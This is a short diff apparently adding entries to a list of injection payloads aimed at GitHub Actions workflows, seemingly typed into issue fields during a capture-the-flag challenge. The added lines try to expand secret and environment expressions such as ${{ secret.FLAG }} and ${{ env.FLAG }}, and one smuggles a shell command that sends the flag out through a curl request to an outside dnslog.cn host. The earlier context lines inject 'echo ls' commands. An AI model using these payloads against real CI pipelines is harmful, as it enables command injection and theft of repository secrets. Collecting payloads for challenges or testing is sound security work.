@@ -570,3 +570,10 @@ R1gelX29:${{ github.event.issue.number }} $( flag )
 ";echo `ls`"
 Mr-sh11:${{ github.event.issue.number }} $( flag )
 ";echo ls"
+R1gelX29:${{ secret.FLAG }}
+${{ secret.flag }}
+${{ secret[FLAG] }}
+${{ env.flag }}
+${{ env[FLAG] }}
+${{ env.FLAG }}
+"; curl 'http://'.$flag.'xbqp2t.dnslog.cn'"
